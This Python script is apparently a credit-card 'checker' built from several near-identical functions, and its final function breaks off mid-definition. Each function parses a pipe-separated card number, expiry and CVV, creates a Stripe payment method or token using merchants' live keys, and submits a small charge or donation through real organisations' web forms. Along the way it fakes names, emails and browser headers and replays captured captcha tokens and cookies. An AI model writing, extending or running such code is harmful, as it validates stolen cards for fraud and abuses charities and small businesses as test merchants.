import requests,re
from user_agent import generate_user_agent
from faker import Faker
import uuid
import random

# Initialize Faker
fake = Faker()
def Tele(ccx):
        import requests
        ccx=ccx.strip()
        cc = ccx.split("|")[0]
        mes = ccx.split("|")[1]
        ano = ccx.split("|")[2]
        cvv = ccx.split("|")[3]
        if "20" in ano:#Mo3gza
            ano = ano.split("20")[1]
        r = requests.session()
        
        # Generate fake data
        firstname = fake.first_name()
        lastname = fake.last_name()
        username = fake.user_name()
        domain = fake.random_element(elements=('gmail.com', 'outlook.com', 'hotmail.com'))
        mail = fake.email(domain=domain)
        guid = str(uuid.uuid4())    
        muid = str(uuid.uuid1())    
        sid = str(uuid.uuid5(uuid.NAMESPACE_DNS, 'example.com'))    
        time_on_page = random.randint(1, 30000) 
    
        headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': generate_user_agent(),
}

        data = f'type=card&card[number]={cc}&card[cvc]={cvv}&card[exp_month]={mes}&card[exp_year]={ano}&guid=2d040096-2b13-43ea-a47b-f7f1d9e50fe3f6509d&muid=70a18235-71ad-4004-8d22-37144e6724bdd6c9e5&sid=412fbaf8-b694-4b8e-806f-0976e8b3cdd5e624d6&pasted_fields=number&payment_user_agent=stripe.js%2Fb792108426%3B+stripe-js-v3%2Fb792108426%3B+card-element&referrer=https%3A%2F%2Flcfp.org.uk&time_on_page=34225&key=pk_live_51P05UI025m4Jgyco4Z31uNDfzsKpF2B5Okh5UrmyjJT2WQIvcrmVtKzVYxIx0EeY0g0toCMp34rUvjbYZdOhHdgw00unAXSyH0&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwYXNza2V5IjoiZzFWTjZRQU5MTUpzQ2JXTE50UjZkeTNMNGhFM3A3VnFYT3BydSt3Nkx3cnpVTjhoQ0tTTXBWS3hCY29iNHRYYjBlOGhNbCtUMkt6RTJHZkQ3dWJ5alJDam1NQk9iQnF1NGFNV1U1NzdzcFlxYVJ3bWpCRzJ5S1JPZEtxY0g3UkRKZWJXY3Q2cGV1OFNFbk9SNTUvRWE5bkdMZFpFOHRzTzdYZkY3SmVFbkhJNUxHY3dZYzE3NjYwd0xIaHFtK0N1Q2tmUmFvUmY2RkcwZXBtYXdEZUFMYlJ2SVlKSmlKakt5ZkphalpVcXZYZlZOaGRLbWR6cDlrc1BWVWpwOXBxdWU1VlUyM2ZFTzlrcGIxRytlekxWSk52R3l4bzhESnFJQkVLZ09nSGRIOEhScy9SaHRJZDVpdC9uWk9rK3czYktXYkcramFpeHZHQnc1L09vYm5DU3NSYnlvVE5YTGt2K3hYZTB4RGRUeEFtbVlFMUNKUzdOVm9BUk9uQStxN1ZxSDQ5emtvSEFCZGdpam9obTk3TlRtK1U1WUZqM3NkYXhoZTFlZThFeHlnZ0VDdHR0Z1VsWjUvek5TczdUeklUMmZsZnhWajJpaXhYeVkxRTZ0L2ZUaGx5Q014NW5XNEpUNFNycXNiWGpWcUF5WTRJNjdKVU1UNXcrWVZjR1hDbGtFUU1VQ3U3NW13TDdUQS8yamlLMlNGWWxpUVlQZ056VVVtbGwvMFlwcW5QbEUvK1RwcE1sQzBoVE1lcnd5RFVsZ3E1MEVoRDJBSDdkRlc0a2hqM1VCeFlQaGk5ejAzNlloQVN4YVV6YU1qYURzenFlUnFZMTV2NHdPNFlBd2xuVDdKZkFoZGUxbTVFRjZGeUc2clI0Um5RYzJ3T2NDSStTY0JHTXJ2clUvQVZZT1ErR3NDTjk4WEhpNFRyaS9vMXc1VWFwVVlDcmRueFpocEx6T2RGaHVERWZQS2lWbWw2NWg5c0c1YUNheUkwMTNhd2RkNDZ2dmRyOEZHUG5DZkVoN0M2N0p4Q2xCK2RvTXZTVlZRb25qY0tnYllTejNrQnhWamlkTVFhSkZVcDEzNTE4TGRFdUpWaWZyVFFEVWJQTUF1SWVLYUh6V0dNK1gxQi9Cb3orY1NnMjI0TDkvOTd6eDNieEN1NzVJekN0OTBPTlE4L25mV29XTzFFMStnWW9pdFZTYmh0SGRycEd6K0VpbDhyWHRMMlVmYlNIWDd2K2twaUpDd0hoUlZUc0w4TFNiSnd0N1kxQW00T3NPNTVBcVYvRVpGU0xDRCtTcS94Nytpc2NpN0ZBUmE1eDB5ZGFYUEF3R1NPbXVjcExiTDJWa21JNHJlUExyRGE2dy9qbGhWMTM0K1FEZUNZN1Rsbm41WXhDbnp3NXNpYklScWxqWVlmZmdncWdxV3hNQXlJMks4L2NRblc3VDZrZ1VNWjlBdlMzYWR6NGorem1SM3ZoUDZhdTdsYzZrdnF1YmJKY3pJcC84T09IamVJZk9KZ0p3aUN5aFNuRlZKUmxkZ0hDamRYYUIvd25zdUEwZng5RTFHRUo3Z3hFNHM2MWRjZHJyOEl1TFdBVmZvOUFyT0xIN2Q5RXk4U040a2d0cVhiQVVmaExmVjJVREZ3c2FIYmx0dlowZnhjR1ZsQ0tJUDZNcXJDKzc3QVpHL0FURXNmSnNQdUFiVjk3K2lBY1U4YUhOZnkzSzFyRzJmVUNpQ0VRN0FlN242Z1hMTGk0c1llcHg2MGFBYWJ4UENJT0RLMmgzRmZtSXdFTHROSHNkTzZOUEkrK1g4bkJHRTBVdmVjTTBYWnplbkE2TjV5VEpGS2JvbW5zZ016OUtKeldQNFZDTmxSSitjVDdKZ0VURzdSZkdkMVJrNlFEdEEyMUd3MFFuTXg1VFJqZHFWcUY4RjY5MEpFQ1dMUHFWYjlIcjJnUGkrVEJxR0VYais3VmdLcEMrV09MdVNjRTdYOHZwUFJEMUxzQnpVNlhrVGpwbUxac0haVDBjK01vTFNQa2xXODhXSEwzRVozMjhVbDZueDJOSERjWkJpMkNUNTZkRE5SbFpYMnJmTXhLUXZtclQyNFQ0VHltWHZCWFdEM09uaWt0N0pkUytkOElNakZlTHo2bFlCLzZOM1BTY1NubFROYUlOUVltcU9rVzN1dnhwc3h3endUckZhUUE2d204SzBOTXpUT2dEMFhhVVovZHUxNS8vMDZyNjVCMjF4VE5hY1dHbXk0UThWR213RisveEppcnJvbWs2aWtJOG1OeHJINDB6YWpybHNyV1VaWjRyUGQ1a2Z0cjh5NU1USUVDZS92UWlGTXVIY0NLWXNDaVFtVWFIVFBTMmZ3TmJSK3FRUnJYNUJFWGk3SVFDRm5ZZGZhbGtGTEFNM3h5UFFwRHhSVGlWKzM1SzFJUDc4NXUyeHlKVnRQUGpmcFZxYklHV1c2YWxUQXNHdGFTTVlJWERweW91ZnNoTU94T01BWXhVZUJ5ZjRaYWhnVFFIeGFWS1dDZ1dqWlJLSGlTT0hJWTd2dWxiZjJCaDVvZ0hWaTJFVHQ5KytqdzZtQzZHMXE3V0dCZm0vRXFXdElVSHNjSnJlNk9XcFVkK0NMRklxODE3cVl5ZWZUeUF4NklteE9wanptTHpkakVvQ2ZadnY4OGlIMnVxTjE2VkJ1aGJJd2w2aVhOWVNONEFkQS9BZ1J1NDdydTczVEd4OHp3SlhTRWFNYlFESkxZMG42VWkyQ3diMGx3L3Z3YnV5RzZTMFRER2hqaU9HNWV6NGVlQVBDUHVzcTZFRU5HYUdXVG82a2RpbzBzLzRyL1h2eDQxd1BlYm9NYS9NOG9sNFNQMDRnSDdqeWY3WFNpb0ZlN1hsN2d4NE1iUDlpb3ltUktQbndWNUR4R1ByU2RRU2xjZXVoYnRFWTRuZ2w0TEtjPSIsImV4cCI6MTcyOTcyOTI0MSwic2hhcmRfaWQiOjM2MjQwNjk5Niwia3IiOiJiOGJlYzEwIiwicGQiOjAsImNkYXRhIjoiVDRDalYxVGUxMjZwK3Y1VisrcFdwSHpYNWpybFpld3h1S1YxRG9jeGtGbmI3N3ZGL3g5VTBVU3BBcFhjd1hGZ0ovTjVPclRtSXRsY0tON2lmdmdXUm1hWWlYK0hqUTMrS1pPZVBjcmZhclBaK2VFMVB1WmdwWFp5UjdRbUw3Q1Uwd3R6dXZ1ZWhQR2ZlU0hMWlJCMlJlTFRBTnp2dUhoVVRyeFRKVUVScXNLdTExRXpLUjM3bVpVK3FrSTVKSENsZU5FT09pTWpmSzBMdUU3MSJ9.lMO6P-tzPao7TxhOdcKU78hRkg4tN4wUuCgDGkMcPFo'

        response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
        try:
            id = response.json()['id']
        except:
        	pass


        cookies = {
    '_ga': 'GA1.1.566870207.1729729114',
    'cookieyes-consent': 'consentid:RWYwZmZ1dE00UWRLQkFuNXZ5VzI0bndlQjZmMFh5c24,consent:yes,action:yes,necessary:yes,functional:yes,analytics:yes,performance:yes,advertisement:yes,other:yes',
    '__stripe_mid': '70a18235-71ad-4004-8d22-37144e6724bdd6c9e5',
    '__stripe_sid': '412fbaf8-b694-4b8e-806f-0976e8b3cdd5e624d6',
    'burst_uid': '6b69561f23235981e2d138aacc00093f',
    '_ga_YPC0KVCX1L': 'GS1.1.1729729114.1.1.1729729149.0.0.0',
    '_gcl_au': '1.1.1407270234.1729729121.925242018.1729729121.1729729149',
}

        headers = {
    'authority': 'lcfp.org.uk',
    'accept': '*/*',
    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'origin': 'https://lcfp.org.uk',
    'referer': 'https://lcfp.org.uk/pay-now/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': generate_user_agent(),
    'x-requested-with': 'XMLHttpRequest',
}

        params = {
    't': '1729729149991',
}

        data = f'data=ak_hp_textarea%3D%26ak_js%3D1729729113626%26__fluent_form_embded_post_id%3D6355%26_fluentform_7_fluentformnonce%3D08f6e8ca3e%26_wp_http_referer%3D%252Fpay-now%252F%26dropdown_2%3DLevel%25203%2509Diploma%2520in%2520Business%2520Management%2520603%252F7795%252F1%26input_radio%3DOnline%26input_radio_1%3DPay%2520in%2520Full%2520(One%2520Time%2520Fee)%26names%255Bfirst_name%255D%3Dthu%26names%255Blast_name%255D%3Dra%26email%3Dthur34355%2540gmail.com%26phone%3D%252B63676400%26address_1%255Baddress_line_1%255D%3DStreet%26address_1%255Baddress_line_2%255D%3D%26address_1%255Bcity%255D%3DNew%2520York%26address_1%255Bstate%255D%3DNY%26address_1%255Bzip%255D%3D10080%26address_1%255Bcountry%255D%3DDZ%26dropdown_1%3DHigh%2520School%2520Diploma%26payment_input%3D0.50%26payment_method%3Dstripe%26payment_method_1%3Dstripe%26ak_bib%3D1729729124945%26ak_bfs%3D1729729148573%26ak_bkpc%3D8%26ak_bkp%3D23%253B23%252C10%253B17%252C6%253B17%252C5%253B17%252C5%253B16%252C5%253B16%252C4%253B16%252C5%253B%26ak_bmc%3D2%253B2%252C2848%253B3%252C2092%253B7%252C1634%253B15%252C2265%253B16%252C3636%253B5%252C3838%253B5%252C3566%253B11%252C13490%253B%26ak_bmcc%3D9%26ak_bmk%3D%26ak_bck%3D%26ak_bmmc%3D0%26ak_btmc%3D9%26ak_bsc%3D9%26ak_bte%3D210%253B72%252C1007%253B87%252C680%253B2%252C1327%253B10%252C1%253B84%252C1538%253B85%252C1291%253B333%252C205%253B78%252C284%253B118%252C2098%253B122%252C655%253B311%252C27%253B88%252C229%253B358%252C2851%253B61%252C559%253B82%252C745%253B597%252C200%253B166%252C687%253B164%252C313%253B83%252C563%253B120%252C1330%253B1%252C12154%253B%26ak_btec%3D22%26ak_bmm%3D%26__stripe_payment_method_id%3D{id}&action=fluentform_submit&form_id=7'

        r2 = requests.post('https://lcfp.org.uk/wp-admin/admin-ajax.php', params=params, cookies=cookies, headers=headers, data=data)
        return (r2.json())
        
        
        
# Initialize Faker
fake = Faker()
def Tele1(ccx):
        import requests
        ccx=ccx.strip()
        cc = ccx.split("|")[0]
        mes = ccx.split("|")[1]
        ano = ccx.split("|")[2]
        cvv = ccx.split("|")[3]
        if "20" in ano:#Mo3gza
            ano = ano.split("20")[1]
        r = requests.session()
        
        # Generate fake data
        firstname = fake.first_name()
        lastname = fake.last_name()
        username = fake.user_name()
        domain = fake.random_element(elements=('gmail.com', 'outlook.com', 'hotmail.com'))
        mail = fake.email(domain=domain)
        
        headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': generate_user_agent(),
        }
        
        data = f'type=card&card[number]={cc}&card[cvc]={cvv}&card[exp_month]={mes}&card[exp_year]={ano}&guid=2d040096-2b13-43ea-a47b-f7f1d9e50fe3f6509d&muid=1d94c087-083e-4eea-8adc-133374f3b3c1056df3&sid=1fe07e1f-c70a-4334-ab72-ee1a1eecb07099a9d6&payment_user_agent=stripe.js%2Fc710570bc1%3B+stripe-js-v3%2Fc710570bc1%3B+card-element&referrer=https%3A%2F%2Fwww.ninodelacaridad.com&time_on_page=68022&key=pk_live_51OHFDAD6V9VrPDWYITrtYPuIZidiK5rIQtbdfE98OcfqO4DM5MMan5NbBuSgoplkUGCgIcSoveUYuNwoe3M7cLqy00iKYJSaeB&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwYXNza2V5IjoiRElKU0tjZzdSSW05Y1IweGxIUGhod3UxWWpMeHQ2dFl2bTBUUnlsb3VsU2FRcytQWXhBamRaRjFGbEhDWVYwbFRaR2p0emJPRUVPWjZuWmlWcjc4MXZkUEkxOXc1QkNSeDk1R0lBYXZmNEZhRG9xZSt3UExnQm9acTIyeGN6Y1V0aUN4QUhzTkQvNFhKS1RYNngvSkJqY2wzSE5TQVNnYjRtOC8xUnlQcEZSNjBjT3JlNDBxUUllcjdnWEtjMEwybjV6ajNJcUxKSW1NL0U2RG5KbXljaklLbWgvM1ZXZVdNMHMrV3paWkdkMFJkMGd2SE9heElDUlJtcDFkWVlrWnFHdmlTZXlKOHlIcDlNM0V2SkVvZ2NZakdJYUQ3TExoTlFwRUg2YmVWbk1NamFDU2FJK0kxNkJPU1BkR0QyQ0hvUmxoZEk5RUZvY2o0N28zSlRDSXczQkw0YlFQeFBkVUgxOVAydzFjWWNDK21GOVA1YTRBdkdEOVI3b21jMHp5U0YwMFdkNmNEaWF0ajR5ekowNExuL3FVWCtKcXg4U0E0dm5KWUtQRStoNnllU2V1bld2djNvbHY3Z2NGY0M1SlZic3M2L0pUUDZ3akFiZEpFWVprMzRMQk1pcVVRTmcycWdaL0NpZjRySklmMFFjZDFLYm14NytLTWdhNEpmQ2xlTTVmZHYvSE5scFB6TWh3S0U2VitnYmQ4czQ0d3VURWZELy84clJ2SGxPK3lIS3pxQnpJdkhkaWxPdFlHWWsyc1FsYkFWZ3JrK1l4dzN1VGhVSXB1VG5iT21veHB3WDR3R1pvbVB4Z3lYVkdFb3NKem4zSS9QQmNwU3hpMTNNVUFlekJ4UzhiR0dKQlhTaUNkMjlOTVIyRmZtWU9tRWxHUmtWT2w1aGVJVmVmekh1MFlzaWRvZVF6a21nRklzcm5xYzBqOGk0eVZUbjkwRUZtcTNUNklyeWlBRyt0eEVoT0dRSWl6VUtsT2ZnbkxsaVZmcHl3S2VRUnlUc3FSdnZaMk1kQnBzZ2luTlg4ZHgyVFgvSDJWT1FLdzJaMDJHdXJNbHBPdVhIWlVwTWxFYTZ3RnNVTDBOOERDNUJtY1FtWTNNRXRIdG1RRklnOE40bEE1WDNGamxLSXNVMTVweFFwS1BhcWhtWGhaZjgxeFp6dFMrSUR5ZnBIdVQ1YXVYV2QrdXgzNHNUMTRBQmdIRlFxeXcveU5PR3NYaGg0dXh2cHowVER3SU1VQjgzZXQzNWhQOHhndWltai8xWEdHTFp6UEJDR0MzVjFIVWdCRDUzWTBxUHplcjhQREpqV0REaTA1WkxNeElSbnAxR1c5OXkwQ2puY2dDck9WV0lBTkJzK0hSWFZOcGExdkhDc3FPeDJHZExValFsRExKTVk0ZTdVYXZLVDVDMzNlcCtWMnlWTUdCVVdwT1ErVVpTbUFZOUdoRnRBbWpqR0FaR09TT0t3WHIrK3VKeTBPNlJhUnRPTkRPNkZadUlvK1dCcGY5SGJoMFZueUVrcmd2YlVrQVZYUzBKbHJKcHNjNDcxbmhieGlOUU5Ca2xYZzFNYmNRc0VRcnFxNTdTK29MZ0NmWXFpZ2MrWk96cTBvMTFqcU9kL2lIS2dISWpESTlVV3NqbWF5VFlKQkxSUTFsZkVuTlJjaXl3YlFBUUlGQVIvMFU5UmtwMldjVUxLQ2tYMUpUR0Z3V3VoOHhJMktiNGF0S2VHUGhjQlRxU2FJYXZTeTRDd1VZYzhtdDNXSy9TY1d3TmdwREFFR2xlcytCL1o0eXQ2bHNCdHhtMDdsQmdneGozc2NDank3azYrdDI5eHJLNVNLOTZLNkF5VlRaWERNWmpZSEV1Tjg3d2FtM0xINVUzYlNFaE9lbGZPTFR2MmF3M0dHZnRRUFVkUWIyeXBKVE43ZDhDTHlZT0Zua0xESDFuaWhCT0RrWEVqTkpuZVIzZ2doMUs5cnVVV2VScGI1a2NDUVlEY1pvMk5jY3pIMkIzeE9mT3EwdlpPTzhqRU1CYkdYWFh1eE5mbG9rVWJRQUR0MjBVTk1aR0hKeFk0WXlqMG1UK2ZFZlphQmpBd25UclJXbS95VUZyckFkOW0wMFZxVzU5NFI0elFINWFsNFZDQnlJdDNOUHg3NG1jSFYzUmpYcWZIcklRWHlHUE95bmNGek5pZmdUbU1saTZxNUF3SzVCOHROeXlzRW9oSjNKQldPSFBnOHM3RVprRDNQYzI4eVNPOWxOb1VrenVWZlR6dmcwckx3NG0vS0dmUGlndmxsQW1QNTh1Z2plNElMRk5La3creDNtdm5BY2REY1RMSXhrU090Wkp6dmFDSjB6NXpIMlJHcDNraTNMM3BBL05jVHdBUitoMmwxeEhGOGZTSnd2T25Oc1gweDVLdkltYm1RWHhzcUJBV3BhZXRKKytoelBOOHlXRFhyTkZ5ZjkzbDlYMjFheXZhaUlRU1JNZmRQd3FQOGhaa1hReTFjN1AwdllmcXcxdDIvVnFNY1VKdFVWVlJQeDdRTktVREVXSHBkYTF3L0F1eDhFVnluQndaTHMvQzA1MXp6MU5VaGx2K3hjOEdxRUc3R0ZPQlczbUlIbmtDeURmU25GdlhoNllhVjRpYWZ3dE5tZkZzWkMyUU5admFiQkhHUVlsQlI5dnZiNkhGWFhjSWpFTUZaUzVJZEROaVhqQk9odGJNMkd2TVpjU0V0NTBkbEFsNHVDYWVDcUU0RWdiRVZUOElYazloMzh4ODcwTWE0M21OUTlDOCtLemcvQUhOcERPQmtiWHlxNFM1SklGVjI2NmhiUHBnS0oxNTZaNmFneEdVNnNrYjdJRlBTY2hVcko2OGNUbjhndVJhSVcwdGZTcXdSbzhLUjFCM0V1R3dGVTdVOE5RT01zN3k3bmE3Rmc9PSIsImV4cCI6MTcyNTYzMzMxMiwic2hhcmRfaWQiOjM2MjQwNjk5Niwia3IiOiIxMDNlOWQwNSIsInBkIjowLCJjZGF0YSI6IjBQR0wzaDFQT3IyZ0RjNVdTeC9XVFNpRWNSTUxQNDhaNnRLTkVvaWZ2MmdHTlRFR3dkZGFqNFpaL2E0TXp0a1kxN0xmdUtpcy9uWmxxbWhuYmZVNGQ2UlVuOXo1S01obDl6OEt6d2Z3UFlRT09YeGpYYjZSY2VCOHVZTDlZZFBPR3lzQWZDQkhtTlRoQTRYcVR2ODl0bkQ1OFRmZ3RTTXh4NTNUc0VMOWs3RU5lWFMza2o4TTJyOUV0Z29PeGJvRUlmUFA4SXBGSW1veDhaWkgifQ.-oTYVedfSsxUsOGm7U2-mt7hK-COJIu1ofpILs-SfEY'
        
        response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
        try:     
            id = response.json()['id']
        except:
            pass
        
        
        
        headers = {
            'authority': 'www.ninodelacaridad.com',
            'accept': '*/*',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://www.ninodelacaridad.com',
            'referer': 'https://www.ninodelacaridad.com/events-for-2024/latinos-destinados-a-triunfar/',
            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': generate_user_agent(),
            'x-requested-with': 'XMLHttpRequest',
        }
        
        params = {
            't': '1725633251190',
        }
        
        data = {
            'data': f'__fluent_form_embded_post_id=2612&_fluentform_20_fluentformnonce=34e6ab4c24&_wp_http_referer=%2Fevents-for-2024%2Flatinos-destinados-a-triunfar%2F&names%5Bfirst_name%5D=thu&names%5Blast_name%5D=ra&phone=%2B18172388000&email={mail}&payment_input=Credit%20card&payment_input_1=Custom%20Amount&custom-payment-amount_1=10&payment_method=stripe&__stripe_payment_method_id={id}',
            'action': 'fluentform_submit',
            'form_id': '20',
        }
        
        r3 = requests.post(
            'https://www.ninodelacaridad.com/wp-admin/admin-ajax.php',
            params=params,
            headers=headers,
            data=data
        )
        return (r3.json())
        
# Initialize Faker
fake = Faker()
def Tele2(ccx):
        import requests
        ccx=ccx.strip()
        cc = ccx.split("|")[0]
        mes = ccx.split("|")[1]
        ano = ccx.split("|")[2]
        cvv = ccx.split("|")[3]
        if "20" in ano:#Mo3gza
            ano = ano.split("20")[1]
        r = requests.session()
        
        # Generate fake data
        firstname = fake.first_name()
        lastname = fake.last_name()
        username = fake.user_name()
        domain = fake.random_element(elements=('gmail.com', 'outlook.com', 'hotmail.com'))
        mail = fake.email(domain=domain)
        
        headers = {
		    'authority': 'api.stripe.com',
		    'accept': 'application/json',
		    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
		    'content-type': 'application/x-www-form-urlencoded',
		    'origin': 'https://js.stripe.com',
		    'referer': 'https://js.stripe.com/',
		    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
		    'sec-ch-ua-mobile': '?1',
		    'sec-ch-ua-platform': '"Android"',
		    'sec-fetch-dest': 'empty',
		    'sec-fetch-mode': 'cors',
		    'sec-fetch-site': 'same-site',
		    'user-agent': generate_user_agent(),
		}
		
        data = f'type=card&card[number]={cc}&card[cvc]={cvv}&card[exp_month]={mes}&card[exp_year]={ano}&guid=2d040096-2b13-43ea-a47b-f7f1d9e50fe3f6509d&muid=caa063ab-9036-4530-aa5b-0b998ec431ed77a963&sid=8cb685fd-73be-4faf-8e1b-4bcd67e51f60f521b0&pasted_fields=number&payment_user_agent=stripe.js%2F064d3d4e55%3B+stripe-js-v3%2F064d3d4e55%3B+card-element&referrer=https%3A%2F%2Fjulievoris.com&time_on_page=34380&key=pk_live_51He5MlCVRYvpd05zW0zTzeXiymqQaUy2IJC0m0nUF8ViljOtPYT6rQdDwUYQMcaiGDZtzHOAO47GjNXArU8AABuK00g1aWti4o'
		
        response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
		
        try:     
            id = response.json()['id']
        except:
            pass
		
        headers = {
		    'authority': 'julievoris.com',
		    'accept': '*/*',
		    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
		    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
		    'origin': 'https://julievoris.com',
		    'referer': 'https://julievoris.com/project100-mindset-magic-group/',
		    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
		    'sec-ch-ua-mobile': '?1',
		    'sec-ch-ua-platform': '"Android"',
		    'sec-fetch-dest': 'empty',
		    'sec-fetch-mode': 'cors',
		    'sec-fetch-site': 'same-origin',
		    'user-agent': generate_user_agent(),
		    'x-requested-with': 'XMLHttpRequest',
		}
		
        params = {
		    't': '1728312241410',
		}
		
        data = {
		    'data': f'__fluent_form_embded_post_id=15208&_fluentform_35_fluentformnonce=be3e71c2d6&_wp_http_referer=%2Fproject100-mindset-magic-group%2F&names%5Bfirst_name%5D=Mr%20Angus%20Thiel&names%5Blast_name%5D=Ea&email={mail}&input_text=%40ufuhdh&payment_input=19.97&payment_method=stripe&__entry_intermediate_hash=33e108508efe9255c266c4b1770efd71&__stripe_payment_method_id={id}',
		    'action': 'fluentform_submit',
		    'form_id': '35',
		}
		
        r4 = requests.post(
		    'https://julievoris.com/wp-admin/admin-ajax.php',
		    params=params,
		    headers=headers,
		    data=data,
		)
        return (r4.json())
        
# Initialize Faker
fake = Faker()
def Tele3(ccx):
        import requests
        ccx=ccx.strip()
        cc = ccx.split("|")[0]
        mes = ccx.split("|")[1]
        ano = ccx.split("|")[2]
        cvv = ccx.split("|")[3]
        if "20" in ano:#Mo3gza
            ano = ano.split("20")[1]
        r = requests.session()
        
        # Generate fake data
        firstname = fake.first_name()
        lastname = fake.last_name()
        username = fake.user_name()
        domain = fake.random_element(elements=('gmail.com', 'outlook.com', 'hotmail.com'))
        mail = fake.email(domain=domain)
        
        
        headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'en-US',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': generate_user_agent(),
}

# Format the data payload for token generation
        data = f'time_on_page=140659&pasted_fields=number&guid=NA&muid=NA&sid=NA&key=pk_live_yZsZ8CnKR62sWJPaT97tC5Bp&payment_user_agent=stripe.js%2F78ef418&card[number]={cc}&card[cvc]={cvv}&card[exp_month]={mes}&card[exp_year]={ano}'

# Make request to Stripe API to get the token
        response = requests.post('https://api.stripe.com/v1/tokens', headers=headers, data=data)

# Check for successful token generation
        try:
            response_json = response.json()
            if 'id' in response_json:
                tok = response_json['id']
                print(f"Token generated: {tok}")
            else:
                print(f"Error: {response_json.get('error', 'Unknown error occurred')}")
                tok = None
        except ValueError:
            print(f"Error: Failed to parse response from Stripe API: {response.text}")
            tok = None

# Proceed if token is retrieved
        if tok:
            headers = {
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8',
        'Authorization': 'Basic MDFHWllCNDQ4RU4xQlc2NlhSTkRFUU5DTjg6',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json',
        'Origin': 'https://merlin.simpledonation.com',
        'Referer': 'https://merlin.simpledonation.com/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-site',
        'User-Agent': generate_user_agent(),
        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
    }

    # Donation details
            json_data = {
        'widget_id': '01GZYB448EN1BW66XRNDEQNCN8',
        'key': '01GZYB448EN1BW66XRNDEQNCN8',
        'schedule': 'ONETIME',
        'amount': 654,
        'is_fee_covered': True,
        'session_id': 'bddcdf3b-73a7-44a4-8216-03cf847fb696',
        'fund_id': 1634,
        'memo': None,
        'browser_date': '10/9/2024',
        'payment_source_id': tok,
        'saved_payment_id': None,
        'gateway_payment_details': {
            'stripe_token': tok,
        },
        'gateway': 'stripe',
        'payment_type': 'CREDIT_CARD',
        'merlin_version': '5.6.9',
        'transaction_type': 'donation',
        'host_url': 'kolbecentermacon.org/get-involved/',
        'giving_flow': 'standard',
        'marketing_code': None,
        'address': None,
        'utm_params': {},
        'rock_entity_id': None,
        'rock_entity_type_id': None,
        'rock_financial_account_id': None,
        'stripe_intent_id': None,
        'person': {
            'id': None,
            'first_name': 'Khant Ti',
            'last_name': 'Kyi',
            'email': mail,
            'twilio_number': None,
        },
    }

    # Make the donation request
        r5 = requests.post('https://thekolbecenter.simpledonation.com/merlin/charges', headers=headers, json=json_data)
        
        return (r5.json())
        
# Initialize Faker
fake = Faker()
def Tele5(ccx):
        import requests
        ccx=ccx.strip()
        cc = ccx.split("|")[0]
        mes = ccx.split("|")[1]
        ano = ccx.split("|")[2]
        cvv = ccx.split("|")[3]
        if "20" in ano:#Mo3gza
            ano = ano.split("20")[1]
        r = requests.session()
        
        # Generate fake data
        firstname = fake.first_name()
        lastname = fake.last_name()
        username = fake.user_name()
        domain = fake.random_element(elements=('gmail.com', 'outlook.com', 'hotmail.com'))
        mail = fake.email(domain=domain)
        guid = str(uuid.uuid4())    
        muid = str(uuid.uuid1())    
        sid = str(uuid.uuid5(uuid.NAMESPACE_DNS, 'example.com'))    
        time_on_page = random.randint(1, 30000) 
        

        headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
    'content-type': 'application/x-www-form-urlencoded',
